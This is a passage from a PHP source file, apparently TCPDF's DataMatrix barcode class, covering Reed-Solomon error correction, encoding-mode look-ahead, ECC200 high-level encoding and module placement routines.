	 * @param $b (int) second number to multiply.
	 * @param $log (array) Log table.
	 * @param $alog (array) Anti-Log table.
	 * @param $gf (array) Number of Factors of the Reed-Solomon polynomial.
	 * @return int product
	 * @protected
	 */
	protected function getGFProduct($a, $b, $log, $alog, $gf) {
		if (($a == 0) OR ($b == 0)) {
			return 0;
		}
		return ($alog[($log[$a] + $log[$b]) % ($gf - 1)]);
	}

	/**
	 * Add error correction codewords to data codewords array (ANNEX E).
	 * @param $wd (array) Array of datacodewords.
	 * @param $nb (int) Number of blocks.
	 * @param $nd (int) Number of data codewords per block.
	 * @param $nc (int) Number of correction codewords per block.
	 * @param $gf (int) numner of fields on log/antilog table (power of 2).
	 * @param $pp (int) The value of its prime modulus polynomial (301 for ECC200).
	 * @return array data codewords + error codewords
	 * @protected
	 */
	protected function getErrorCorrection($wd, $nb, $nd, $nc, $gf=256, $pp=301) {
		// generate the log ($log) and antilog ($alog) tables
		$log[0] = 0;
		$alog[0] = 1;
		for ($i = 1; $i < $gf; ++$i) {
			$alog[$i] = ($alog[($i - 1)] * 2);
			if ($alog[$i] >= $gf) {
				$alog[$i] ^= $pp;
			}
			$log[$alog[$i]] = $i;
		}
		ksort($log);
		// generate the polynomial coefficients (c)
		$c = array_fill(0, ($nc + 1), 0);
		$c[0] = 1;
		for ($i = 1; $i <= $nc; ++$i) {
			$c[$i] = $c[($i-1)];
			for ($j = ($i - 1); $j >= 1; --$j) {
				$c[$j] = $c[($j - 1)] ^ $this->getGFProduct($c[$j], $alog[$i], $log, $alog, $gf);
			}
			$c[0] = $this->getGFProduct($c[0], $alog[$i], $log, $alog, $gf);
		}
		ksort($c);
		// total number of data codewords
		$num_wd = ($nb * $nd);
		// total number of error codewords
		$num_we = ($nb * $nc);
		// for each block
		for ($b = 0; $b < $nb; ++$b) {
			// create interleaved data block
			$block = array();
			for ($n = $b; $n < $num_wd; $n += $nb) {
				$block[] = $wd[$n];
			}
			// initialize error codewords
			$we = array_fill(0, ($nc + 1), 0);
			// calculate error correction codewords for this block
			for ($i = 0; $i < $nd; ++$i) {
				$k = ($we[0] ^ $block[$i]);
				for ($j = 0; $j < $nc; ++$j) {
					$we[$j] = ($we[($j + 1)] ^ $this->getGFProduct($k, $c[($nc - $j - 1)], $log, $alog, $gf));
				}
			}
			// add error codewords at the end of data codewords
			$j = 0;
			for ($i = $b; $i < $num_we; $i += $nb) {
				$wd[($num_wd + $i)] = $we[$j];
				++$j;
			}
		}
		// reorder codewords
		ksort($wd);
		return $wd;
	}

	/**
	 * Return the 253-state codeword
	 * @param $cwpad (int) Pad codeword.
	 * @param $cwpos (int) Number of data codewords from the beginning of encoded data.
	 * @return pad codeword
	 * @protected
	 */
	protected function get253StateCodeword($cwpad, $cwpos) {
		$pad = ($cwpad + (((149 * $cwpos) % 253) + 1));
		if ($pad > 254) {
			$pad -= 254;
		}
		return $pad;
	}

	/**
	 * Return the 255-state codeword
	 * @param $cwpad (int) Pad codeword.
	 * @param $cwpos (int) Number of data codewords from the beginning of encoded data.
	 * @return pad codeword
	 * @protected
	 */
	protected function get255StateCodeword($cwpad, $cwpos) {
		$pad = ($cwpad + (((149 * $cwpos) % 255) + 1));
		if ($pad > 255) {
			$pad -= 256;
		}
		return $pad;
	}

	/**
	 * Returns true if the char belongs to the selected mode
	 * @param $chr (int) Character (byte) to check.
	 * @param $mode (int) Current encoding mode.
	 * @return boolean true if the char is of the selected mode.
	 * @protected
	 */
	protected function isCharMode($chr, $mode) {
		$status = false;
		switch ($mode) {
			case ENC_ASCII: { // ASCII character 0 to 127
				$status = (($chr >= 0) AND ($chr <= 127));
				break;
			}
			case ENC_C40: { // Upper-case alphanumeric
				$status = (($chr == 32) OR (($chr >= 48) AND ($chr <= 57)) OR (($chr >= 65) AND ($chr <= 90)));
				break;
			}
			case ENC_TXT: { // Lower-case alphanumeric
				$status = (($chr == 32) OR (($chr >= 48) AND ($chr <= 57)) OR (($chr >= 97) AND ($chr <= 122)));
				break;
			}
			case ENC_X12: { // ANSI X12
				$status = (($chr == 13) OR ($chr == 42) OR ($chr == 62));
				break;
			}
			case ENC_EDF: { // ASCII character 32 to 94
				$status = (($chr >= 32) AND ($chr <= 94));
				break;
			}
			case ENC_BASE256: { // Function character (FNC1, Structured Append, Reader Program, or Code Page)
				$status = (($chr == 232) OR ($chr == 233) OR ($chr == 234) OR ($chr == 241));
				break;
			}
			case ENC_ASCII_EXT: { // ASCII character 128 to 255
				$status = (($chr >= 128) AND ($chr <= 255));
				break;
			}
			case ENC_ASCII_NUM: { // ASCII digits
				$status = (($chr >= 48) AND ($chr <= 57));
				break;
			}
		}
		return $status;
	}

	/**
	 * The look-ahead test scans the data to be encoded to find the best mode (Annex P - steps from J to S).
	 * @param $data (string) data to encode
	 * @param $pos (int) current position
	 * @param $mode (int) current encoding mode
	 * @return int encoding mode
	 * @protected
	 */
	protected function lookAheadTest($data, $pos, $mode) {
		$data_length = strlen($data);
		if ($pos >= $data_length) {
			return $mode;
		}
		$charscount = 0; // count processed chars
		// STEP J
		if ($mode == ENC_ASCII) {
			$numch = array(0, 1, 1, 1, 1, 1.25);
		} else {
			$numch = array(1, 2, 2, 2, 2, 2.25);
			$numch[$mode] = 0;
		}
		while (true) {
			// STEP K
			if (($pos + $charscount) == $data_length) {
				if ($numch[ENC_ASCII] <= ceil(min($numch[ENC_C40], $numch[ENC_TXT], $numch[ENC_X12], $numch[ENC_EDF], $numch[ENC_BASE256]))) {
					return ENC_ASCII;
				}
				if ($numch[ENC_BASE256] < ceil(min($numch[ENC_ASCII], $numch[ENC_C40], $numch[ENC_TXT], $numch[ENC_X12], $numch[ENC_EDF]))) {
					return ENC_BASE256;
				}
				if ($numch[ENC_EDF] < ceil(min($numch[ENC_ASCII], $numch[ENC_C40], $numch[ENC_TXT], $numch[ENC_X12], $numch[ENC_BASE256]))) {
					return ENC_EDF;
				}
				if ($numch[ENC_TXT] < ceil(min($numch[ENC_ASCII], $numch[ENC_C40], $numch[ENC_X12], $numch[ENC_EDF], $numch[ENC_BASE256]))) {
					return ENC_TXT;
				}
				if ($numch[ENC_X12] < ceil(min($numch[ENC_ASCII], $numch[ENC_C40], $numch[ENC_TXT], $numch[ENC_EDF], $numch[ENC_BASE256]))) {
					return ENC_X12;
				}
				return ENC_C40;
			}
			// get char
			$chr = ord($data[$pos + $charscount]);
			$charscount++;
			// STEP L
			if ($this->isCharMode($chr, ENC_ASCII_NUM)) {
				$numch[ENC_ASCII] += (1 / 2);
			} elseif ($this->isCharMode($chr, ENC_ASCII_EXT)) {
				$numch[ENC_ASCII] = ceil($numch[ENC_ASCII]);
				$numch[ENC_ASCII] += 2;
			} else {
				$numch[ENC_ASCII] = ceil($numch[ENC_ASCII]);
				$numch[ENC_ASCII] += 1;
			}
			// STEP M
			if ($this->isCharMode($chr, ENC_C40)) {
				$numch[ENC_C40] += (2 / 3);
			} elseif ($this->isCharMode($chr, ENC_ASCII_EXT)) {
				$numch[ENC_C40] += (8 / 3);
			} else {
				$numch[ENC_C40] += (4 / 3);
			}
			// STEP N
			if ($this->isCharMode($chr, ENC_TXT)) {
				$numch[ENC_TXT] += (2 / 3);
			} elseif ($this->isCharMode($chr, ENC_ASCII_EXT)) {
				$numch[ENC_TXT] += (8 / 3);
			} else {
				$numch[ENC_TXT] += (4 / 3);
			}
			// STEP O
			if ($this->isCharMode($chr, ENC_X12) OR $this->isCharMode($chr, ENC_C40)) {
				$numch[ENC_X12] += (2 / 3);
			} elseif ($this->isCharMode($chr, ENC_ASCII_EXT)) {
				$numch[ENC_X12] += (13 / 3);
			} else {
				$numch[ENC_X12] += (10 / 3);
			}
			// STEP P
			if ($this->isCharMode($chr, ENC_EDF)) {
				$numch[ENC_EDF] += (3 / 4);
			} elseif ($this->isCharMode($chr, ENC_ASCII_EXT)) {
				$numch[ENC_EDF] += (17 / 4);
			} else {
				$numch[ENC_EDF] += (13 / 4);
			}
			// STEP Q
			if ($this->isCharMode($chr, ENC_BASE256)) {
				$numch[ENC_BASE256] += 4;
			} else {
				$numch[ENC_BASE256] += 1;
			}
			// STEP R
			if ($charscount >= 4) {
				if (($numch[ENC_ASCII] + 1) <= min($numch[ENC_C40], $numch[ENC_TXT], $numch[ENC_X12], $numch[ENC_EDF], $numch[ENC_BASE256])) {
					return ENC_ASCII;
				}
				if ((($numch[ENC_BASE256] + 1) <= $numch[ENC_ASCII])
					OR (($numch[ENC_BASE256] + 1) < min($numch[ENC_C40], $numch[ENC_TXT], $numch[ENC_X12], $numch[ENC_EDF]))) {
					return ENC_BASE256;
				}
				if (($numch[ENC_EDF] + 1) < min($numch[ENC_ASCII], $numch[ENC_C40], $numch[ENC_TXT], $numch[ENC_X12], $numch[ENC_BASE256])) {
					return ENC_EDF;
				}
				if (($numch[ENC_TXT] + 1) < min($numch[ENC_ASCII], $numch[ENC_C40], $numch[ENC_X12], $numch[ENC_EDF], $numch[ENC_BASE256])) {
					return ENC_TXT;
				}
				if (($numch[ENC_X12] + 1) < min($numch[ENC_ASCII], $numch[ENC_C40], $numch[ENC_TXT], $numch[ENC_EDF], $numch[ENC_BASE256])) {
					return ENC_X12;
				}
				if (($numch[ENC_C40] + 1) < min($numch[ENC_ASCII], $numch[ENC_TXT], $numch[ENC_EDF], $numch[ENC_BASE256])) {
					if ($numch[ENC_C40] < $numch[ENC_X12]) {
						return ENC_C40;
					}
					if ($numch[ENC_C40] == $numch[ENC_X12]) {
						$k = ($pos + $charscount + 1);
						while ($k < $data_length) {
							$tmpchr = ord($data{$k});
							if ($this->isCharMode($tmpchr, ENC_X12)) {
								return ENC_X12;
							} elseif (!($this->isCharMode($tmpchr, ENC_X12) OR $this->isCharMode($tmpchr, ENC_C40))) {
								break;
							}
							++$k;
						}
						return ENC_C40;
					}
				}
			}
		} // end of while
	}

	/**
	 * Get the switching codeword to a new encoding mode (latch codeword)
	 * @param $mode (int) New encoding mode.
	 * @return (int) Switch codeword.
	 * @protected
	 */
	protected function getSwitchEncodingCodeword($mode) {
		switch ($mode) {
			case ENC_ASCII: { // ASCII character 0 to 127
				$cw = 254;
				if ($this->last_enc == ENC_EDF) {
					$cw = 124;
				}
				break;
			}
			case ENC_C40: { // Upper-case alphanumeric
				$cw = 230;
				break;
			}
			case ENC_TXT: { // Lower-case alphanumeric
				$cw = 239;
				break;
			}
			case ENC_X12: { // ANSI X12
				$cw = 238;
				break;
			}
			case ENC_EDF: { // ASCII character 32 to 94
				$cw = 240;
				break;
			}
			case ENC_BASE256: { // Function character (FNC1, Structured Append, Reader Program, or Code Page)
				$cw = 231;
				break;
			}
		}
		return $cw;
	}

	/**
	 * Choose the minimum matrix size and return the max number of data codewords.
	 * @param $numcw (int) Number of current codewords.
	 * @return number of data codewords in matrix
	 * @protected
	 */
	protected function getMaxDataCodewords($numcw) {
		foreach ($this->symbattr as $key => $matrix) {
			if ($matrix[11] >= $numcw) {
				return $matrix[11];
			}
		}
		return 0;
	}

	/**
	 * Get high level encoding using the minimum symbol data characters for ECC 200
	 * @param $data (string) data to encode
	 * @return array of codewords
	 * @protected
	 */
	protected function getHighLevelEncoding($data) {
		// STEP A. Start in ASCII encodation.
		$enc = ENC_ASCII; // current encoding mode
		$pos = 0; // current position
		$cw = array(); // array of codewords to be returned
		$cw_num = 0; // number of data codewords
		$data_lenght = strlen($data); // number of chars
		while ($pos < $data_lenght) {
			// set last used encoding
			$this->last_enc = $enc;
			switch ($enc) {
				case ENC_ASCII: { // STEP B. While in ASCII encodation
					if (($data_lenght > 1) AND ($pos < ($data_lenght - 1)) AND ($this->isCharMode(ord($data[$pos]), ENC_ASCII_NUM) AND $this->isCharMode(ord($data[$pos + 1]), ENC_ASCII_NUM))) {
						// 1. If the next data sequence is at least 2 consecutive digits, encode the next two digits as a double digit in ASCII mode.
						$cw[] = (intval(substr($data, $pos, 2)) + 130);
						++$cw_num;
						$pos += 2;
					} else {
						// 2. If the look-ahead test (starting at step J) indicates another mode, switch to that mode.
						$newenc = $this->lookAheadTest($data, $pos, $enc);
						if ($newenc != $enc) {
							// switch to new encoding
							$enc = $newenc;
							$cw[] = $this->getSwitchEncodingCodeword($enc);
							++$cw_num;
						} else {
							// get new byte
							$chr = ord($data[$pos]);
							++$pos;
							if ($this->isCharMode($chr, ENC_ASCII_EXT)) {
								// 3. If the next data character is extended ASCII (greater than 127) encode it in ASCII mode first using the Upper Shift (value 235) character.
								$cw[] = 235;
								$cw[] = ($chr - 127);
								$cw_num += 2;
							} else {
								// 4. Otherwise process the next data character in ASCII encodation.
								$cw[] = ($chr + 1);
								++$cw_num;
							}
						}
					}
					break;
				}
				case ENC_C40 :   // Upper-case alphanumeric
				case ENC_TXT :   // Lower-case alphanumeric
				case ENC_X12 : { // ANSI X12
					$temp_cw = array();
					$p = 0;
					$epos = $pos;
					// get charset ID
					$set_id = $this->chset_id[$enc];
					// get basic charset for current encoding
					$charset = $this->chset[$set_id];
					do {
						// 2. process the next character in C40 encodation.
						$chr = ord($data[$epos]);
						++$epos;
						// check for extended character
						if ($chr & 0x80) {
							if ($enc == ENC_X12) {
								return false;
							}
							$chr = ($chr & 0x7f);
							$temp_cw[] = 1; // shift 2
							$temp_cw[] = 30; // upper shift
							$p += 2;
						}
						if (isset($charset[$chr])) {
							$temp_cw[] = $charset[$chr];
							++$p;
						} else {
							if (isset($this->chset['SH1'][$chr])) {
								$temp_cw[] = 0; // shift 1
								$shiftset = $this->chset['SH1'];
							} elseif (isset($chr, $this->chset['SH2'][$chr])) {
								$temp_cw[] = 1; // shift 2
								$shiftset = $this->chset['SH2'];
							} elseif (($enc == ENC_C40) AND isset($this->chset['S3C'][$chr])) {
								$temp_cw[] = 2; // shift 3
								$shiftset = $this->chset['S3C'];
							} elseif (($enc == ENC_TXT) AND isset($this->chset['S3T'][$chr])) {
								$temp_cw[] = 2; // shift 3
								$shiftset = $this->chset['S3T'];
							} else {
								return false;
							}
							$temp_cw[] = $shiftset[$chr];
							$p += 2;
						}
						if ($p >= 3) {
							$c1 = array_shift($temp_cw);
							$c2 = array_shift($temp_cw);
							$c3 = array_shift($temp_cw);
							$p -= 3;
							$tmp = ((1600 * $c1) + (40 * $c2) + $c3 + 1);
							$cw[] = ($tmp >> 8);
							$cw[] = ($tmp % 256);
							$cw_num += 2;
							$pos = $epos;
							// 1. If the C40 encoding is at the point of starting a new double symbol character and if the look-ahead test (starting at step J) indicates another mode, switch to that mode.
							$newenc = $this->lookAheadTest($data, $pos, $enc);
							if ($newenc != $enc) {
								// switch to new encoding
								$enc = $newenc;
								if ($enc != ENC_ASCII) {
									// set unlatch character
									$cw[] = $this->getSwitchEncodingCodeword(ENC_ASCII);
									++$cw_num;
								}
								$cw[] = $this->getSwitchEncodingCodeword($enc);
								++$cw_num;
								$pos -= $p;
								$p = 0;
								break;
							}
						}
					} while (($p > 0) AND ($epos < $data_lenght));
					// process last data (if any)
					if ($p > 0) {
						// get remaining number of data symbols
						$cwr = ($this->getMaxDataCodewords($cw_num) - $cw_num);
						if (($cwr == 1) AND ($p == 1)) {
							// d. If one symbol character remains and one C40 value (data character) remains to be encoded
							$c1 = array_shift($temp_cw);
							--$p;
							$cw[] = ($chr + 1);
							++$cw_num;
							$pos = $epos;
							$enc = ENC_ASCII;
							$this->last_enc = $enc;
						} elseif (($cwr == 2) AND ($p == 1)) {
							// c. If two symbol characters remain and only one C40 value (data character) remains to be encoded
							$c1 = array_shift($temp_cw);
							--$p;
							$cw[] = 254;
							$cw[] = ($chr + 1);
							$cw_num += 2;
							$pos = $epos;
							$enc = ENC_ASCII;
							$this->last_enc = $enc;
						} elseif (($cwr == 2) AND ($p == 2)) {
							// b. If two symbol characters remain and two C40 values remain to be encoded
							$c1 = array_shift($temp_cw);
							$c2 = array_shift($temp_cw);
							$p -= 2;
							$tmp = ((1600 * $c1) + (40 * $c2) + 1);
							$cw[] = ($tmp >> 8);
							$cw[] = ($tmp % 256);
							$cw_num += 2;
							$pos = $epos;
							$enc = ENC_ASCII;
							$this->last_enc = $enc;
						} else {
							// switch to ASCII encoding
							if ($enc != ENC_ASCII) {
								$enc = ENC_ASCII;
								$this->last_enc = $enc;
								$cw[] = $this->getSwitchEncodingCodeword($enc);
								++$cw_num;
								$pos = ($epos - $p);
							}
						}
					}
					break;
				}
				case ENC_EDF: { // F. While in EDIFACT (EDF) encodation
					// initialize temporary array with 0 lenght
					$temp_cw = array();
					$epos = $pos;
					$field_lenght = 0;
					$newenc = $enc;
					do {
						// 2. process the next character in EDIFACT encodation.
						$chr = ord($data[$epos]);
						if ($this->isCharMode($chr, ENC_EDF)) {
							++$epos;
							$temp_cw[] = $chr;
							++$field_lenght;
						}
						if (($field_lenght == 4) OR ($epos == $data_lenght) OR !$this->isCharMode($chr, ENC_EDF)) {
							if (($epos == $data_lenght) AND ($field_lenght < 3)) {
								$enc = ENC_ASCII;
								$cw[] = $this->getSwitchEncodingCodeword($enc);
								++$cw_num;
								break;
							}
							if ($field_lenght < 4) {
								// set unlatch character
								$temp_cw[] = 0x1f;
								++$field_lenght;
								// fill empty characters
								for ($i = $field_lenght; $i < 4; ++$i) {
									$temp_cw[] = 0;
								}
								$enc = ENC_ASCII;
								$this->last_enc = $enc;
							}
							// encodes four data characters in three codewords
							$tcw = (($temp_cw[0] & 0x3F) << 2) + (($temp_cw[1] & 0x30) >> 4);
							if ($tcw > 0) {
								$cw[] = $tcw;
								$cw_num++;
							}
							$tcw= (($temp_cw[1] & 0x0F) << 4) + (($temp_cw[2] & 0x3C) >> 2);
							if ($tcw > 0) {
								$cw[] = $tcw;
								$cw_num++;
							}
							$tcw = (($temp_cw[2] & 0x03) << 6) + ($temp_cw[3] & 0x3F);
							if ($tcw > 0) {
								$cw[] = $tcw;
								$cw_num++;
							}
							$temp_cw = array();
							$pos = $epos;
							$field_lenght = 0;
							if ($enc == ENC_ASCII) {
								break; // exit from EDIFACT mode
							}
						}
					} while ($epos < $data_lenght);
					break;
				}
				case ENC_BASE256: { // G. While in Base 256 (B256) encodation
					// initialize temporary array with 0 lenght
					$temp_cw = array();
					$field_lenght = 0;
					while (($pos < $data_lenght) AND ($field_lenght <= 1555)) {
						$newenc = $this->lookAheadTest($data, $pos, $enc);
						if ($newenc != $enc) {
							// 1. If the look-ahead test (starting at step J) indicates another mode, switch to that mode.
							$enc = $newenc;
							break; // exit from B256 mode
						} else {
							// 2. Otherwise, process the next character in Base 256 encodation.
							$chr = ord($data[$pos]);
							++$pos;
							$temp_cw[] = $chr;
							++$field_lenght;
						}
					}
					// set field lenght
					if ($field_lenght <= 249) {
						$cw[] = $this->get255StateCodeword($field_lenght, ($cw_num + 1));
						++$cw_num;
					} else {
						$cw[] = $this->get255StateCodeword((floor($field_lenght / 250) + 249), ($cw_num + 1));
						$cw[] = $this->get255StateCodeword(($field_lenght % 250), ($cw_num + 2));
						$cw_num += 2;
					}
					if (!empty($temp_cw)) {
						// add B256 field
						foreach ($temp_cw as $p => $cht) {
							$cw[] = $this->get255StateCodeword($cht, ($cw_num + $p + 1));
						}
					}
					break;
				}
			} // end of switch enc
		} // end of while
		return $cw;
	}

	/**
	 * Places "chr+bit" with appropriate wrapping within array[].
	 * (Annex F - ECC 200 symbol character placement)
	 * @param $marr (array) Array of symbols.
	 * @param $nrow (int) Number of rows.
	 * @param $ncol (int) Number of columns.
	 * @param $row (int) Row number.
	 * @param $col (int) Column number.
	 * @param $chr (int) Char byte.
	 * @param $bit (int) Bit.
	 * @return array
	 * @protected
	 */
	protected function placeModule($marr, $nrow, $ncol, $row, $col, $chr, $bit) {
		if ($row < 0) {
			$row += $nrow;
			$col += (4 - (($nrow + 4) % 8));
		}
		if ($col < 0) {
			$col += $ncol;
			$row += (4 - (($ncol + 4) % 8));
		}
		$marr[(($row * $ncol) + $col)] = ((10 * $chr) + $bit);
		return $marr;
	}

	/**
	 * Places the 8 bits of a utah-shaped symbol character.
	 * (Annex F - ECC 200 symbol character placement)
	 * @param $marr (array) Array of symbols.
	 * @param $nrow (int) Number of rows.
	 * @param $ncol (int) Number of columns.
	 * @param $row (int) Row number.
	 * @param $col (int) Column number.
	 * @param $chr (int) Char byte.
	 * @return array
	 * @protected
	 */
	protected function placeUtah($marr, $nrow, $ncol, $row, $col, $chr) {
		$marr = $this->placeModule($marr, $nrow, $ncol, $row-2, $col-2, $chr, 1);
		$marr = $this->placeModule($marr, $nrow, $ncol, $row-2, $col-1, $chr, 2);
		$marr = $this->placeModule($marr, $nrow, $ncol, $row-1, $col-2, $chr, 3);
		$marr = $this->placeModule($marr, $nrow, $ncol, $row-1, $col-1, $chr, 4);
		$marr = $this->placeModule($marr, $nrow, $ncol, $row-1, $col,   $chr, 5);
		$marr = $this->placeModule($marr, $nrow, $ncol, $row,   $col-2, $chr, 6);
		$marr = $this->placeModule($marr, $nrow, $ncol, $row,   $col-1, $chr, 7);
		$marr = $this->placeModule($marr, $nrow, $ncol, $row,   $col,   $chr, 8);
		return $marr;
	}

	/**
	 * Places the 8 bits of the first special corner case.
	 * (Annex F - ECC 200 symbol character placement)
	 * @param $marr (array) Array of symbols.
	 * @param $nrow (int) Number of rows.
	 * @param $ncol (int) Number of columns.
	 * @param $chr (int) Char byte.
	 * @return array
	 * @protected
	 */
	protected function placeCornerA($marr, $nrow, $ncol, $chr) {
		$marr = $this->placeModule($marr, $nrow, $ncol, $nrow-1, 0,       $chr, 1);
		$marr = $this->placeModule($marr, $nrow, $ncol, $nrow-1, 1,       $chr, 2);
		$marr = $this->placeModule($marr, $nrow, $ncol, $nrow-1, 2,       $chr, 3);
		$marr = $this->placeModule($marr, $nrow, $ncol, 0,       $ncol-2, $chr, 4);
		$marr = $this->placeModule($marr, $nrow, $ncol, 0,       $ncol-1, $chr, 5);
		$marr = $this->placeModule($marr, $nrow, $ncol, 1,       $ncol-1, $chr, 6);
		$marr = $this->placeModule($marr, $nrow, $ncol, 2,       $ncol-1, $chr, 7);
		$marr = $this->placeModule($marr, $nrow, $ncol, 3,       $ncol-1, $chr, 8);
		return $marr;
	}

	/**
	 * Places the 8 bits of the second special corner case.
	 * (Annex F - ECC 200 symbol character placement)
	 * @param $marr (array) Array of symbols.
	 * @param $nrow (int) Number of rows.
	 * @param $ncol (int) Number of columns.
	 * @param $chr (int) Char byte.
	 * @return array
	 * @protected
	 */
	protected function placeCornerB($marr, $nrow, $ncol, $chr) {
		$marr = $this->placeModule($marr, $nrow, $ncol, $nrow-3, 0,       $chr, 1);
		$marr = $this->placeModule($marr, $nrow, $ncol, $nrow-2, 0,       $chr, 2);
		$marr = $this->placeModule($marr, $nrow, $ncol, $nrow-1, 0,       $chr, 3);
		$marr = $this->placeModule($marr, $nrow, $ncol, 0,       $ncol-4, $chr, 4);
		$marr = $this->placeModule($marr, $nrow, $ncol, 0,       $ncol-3, $chr, 5);
		$marr = $this->placeModule($marr, $nrow, $ncol, 0,       $ncol-2, $chr, 6);
		$marr = $this->placeModule($marr, $nrow, $ncol, 0,       $ncol-1, $chr, 7);
		$marr = $this->placeModule($marr, $nrow, $ncol, 1,       $ncol-1, $chr, 8);
		return $marr;
	}

	/**
	 * Places the 8 bits of the third special corner case.
	 * (Annex F - ECC 200 symbol character placement)
	 * @param $marr (array) Array of symbols.
	 * @param $nrow (int) Number of rows.
	 * @param $ncol (int) Number of columns.
	 * @param $chr (int) Char byte.
	 * @return array
	 * @protected
	 */
	protected function placeCornerC($marr, $nrow, $ncol, $chr) {
		$marr = $this->placeModule($marr, $nrow, $ncol, $nrow-3, 0,       $chr, 1);
		$marr = $this->placeModule($marr, $nrow, $ncol, $nrow-2, 0,       $chr, 2);
		$marr = $this->placeModule($marr, $nrow, $ncol, $nrow-1, 0,       $chr, 3);
		$marr = $this->placeModule($marr, $nrow, $ncol, 0,       $ncol-2, $chr, 4);
		$marr = $this->placeModule($marr, $nrow, $ncol, 0,       $ncol-1, $chr, 5);
		$marr = $this->placeModule($marr, $nrow, $ncol, 1,       $ncol-1, $chr, 6);
		$marr = $this->placeModule($marr, $nrow, $ncol, 2,       $ncol-1, $chr, 7);
		$marr = $this->placeModule($marr, $nrow, $ncol, 3,       $ncol-1, $chr, 8);
		return $marr;
	}

	/**
	 * Places the 8 bits of the fourth special corner case.
	 * (Annex F - ECC 200 symbol character placement)
	 * @param $marr (array) Array of symbols.
	 * @param $nrow (int) Number of rows.
	 * @param $ncol (int) Number of columns.
	 * @param $chr (int) Char byte.
	 * @return array
	 * @protected
	 */
	protected function placeCornerD($marr, $nrow, $ncol, $chr) {
		$marr = $this->placeModule($marr, $nrow, $ncol, $nrow-1, 0,       $chr, 1);
		$marr = $this->placeModule($marr, $nrow, $ncol, $nrow-1, $ncol-1, $chr, 2);
		$marr = $this->placeModule($marr, $nrow, $ncol, 0,       $ncol-3, $chr, 3);
		$marr = $this->placeModule($marr, $nrow, $ncol, 0,       $ncol-2, $chr, 4);
		$marr = $this->placeModule($marr, $nrow, $ncol, 0,       $ncol-1, $chr, 5);
		$marr = $this->placeModule($marr, $nrow, $ncol, 1,       $ncol-3, $chr, 6);
		$marr = $this->placeModule($marr, $nrow, $ncol, 1,       $ncol-2, $chr, 7);
		$marr = $this->placeModule($marr, $nrow, $ncol, 1,       $ncol-1, $chr, 8);
		return $marr;
	}

	/**
	 * Build a placement map.
	 * (Annex F - ECC 200 symbol character placement)
	 * @param $nrow (int) Number of rows.
	 * @param $ncol (int) Number of columns.
	 * @return array
	 * @protected
	 */
	protected function getPlacementMap($nrow, $ncol) {
		// initialize array with zeros
		$marr = array_fill(0, ($nrow * $ncol), 0);
		// set starting values
		$chr = 1;
		$row = 4;
		$col = 0;
		do {
			// repeatedly first check for one of the special corner cases, then
			if (($row == $nrow) AND ($col == 0)) {
				$marr = $this->placeCornerA($marr, $nrow, $ncol, $chr);
				++$chr;
			}
			if (($row == ($nrow - 2)) AND ($col == 0) AND ($ncol % 4)) {
				$marr = $this->placeCornerB($marr, $nrow, $ncol, $chr);
				++$chr;
			}
			if (($row == ($nrow - 2)) AND ($col == 0) AND (($ncol % 8) == 4)) {
				$marr = $this->placeCornerC($marr, $nrow, $ncol, $chr);
				++$chr;
			}
			if (($row == ($nrow + 4)) AND ($col == 2) AND (!($ncol % 8))) {
				$marr = $this->placeCornerD($marr, $nrow, $ncol, $chr);
				++$chr;
			}
			// sweep upward diagonally, inserting successive characters,
			do {
				if (($row < $nrow) AND ($col >= 0) AND (!$marr[(($row * $ncol) + $col)])) {
					$marr = $this->placeUtah($marr, $nrow, $ncol, $row, $col, $chr);
					++$chr;
				}
				$row -= 2;
				$col += 2;
			} while (($row >= 0) AND ($col < $ncol));
			++$row;
			$col += 3;
			// & then sweep downward diagonally, inserting successive characters,...
			do {
				if (($row >= 0) AND ($col < $ncol) AND (!$marr[(($row * $ncol) + $col)])) {
					$marr = $this->placeUtah($marr, $nrow, $ncol, $row, $col, $chr);
					++$chr;
				}
				$row += 2;
				$col -= 2;
			} while (($row < $nrow) AND ($col >= 0));
			$row += 3;
			++$col;
			// ... until the entire array is scanned
		} while (($row < $nrow) OR ($col < $ncol));
		// lastly, if the lower righthand corner is untouched, fill in fixed pattern
		if (!$marr[(($nrow * $ncol) - 1)]) {
			$marr[(($nrow * $ncol) - 1)] = 1;
			$marr[(($nrow * $ncol) - $ncol - 2)] = 1;
		}
		return $marr;
	}

} // end DataMatrix class
//============================================================+
// END OF FILE
//============================================================+
